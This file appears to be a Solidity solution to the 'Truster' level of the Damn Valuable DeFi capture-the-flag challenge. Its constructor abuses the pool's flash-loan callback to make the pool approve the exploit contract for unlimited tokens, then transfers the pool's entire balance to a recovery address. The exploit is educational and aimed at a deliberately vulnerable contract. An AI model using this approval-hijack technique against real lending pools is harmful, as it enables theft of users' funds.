// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterExploit {
    constructor(address poolAddress, address tokenAddress, address recovery) {
        TrusterLenderPool pool = TrusterLenderPool(poolAddress);
        DamnValuableToken token = DamnValuableToken(tokenAddress);

        // bytes memory data = abi.encodeWithSignature(
        //     "approve(address,uint256)",
        //     address(this), // approve the exploit contract
        //     type(uint256).max
        // );

        // bytes memory data = abi.encodeWithSelector(
        //     token.approve.selector,
        //     address(this), // approve the exploit contract
        //     type(uint256).max
        // );

        bytes memory data = abi.encodeCall(
            token.approve,
            (address(this), type(uint256).max)
        );

        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(
            address(pool),
            recovery,
            token.balanceOf(address(pool))
        );
    }
}
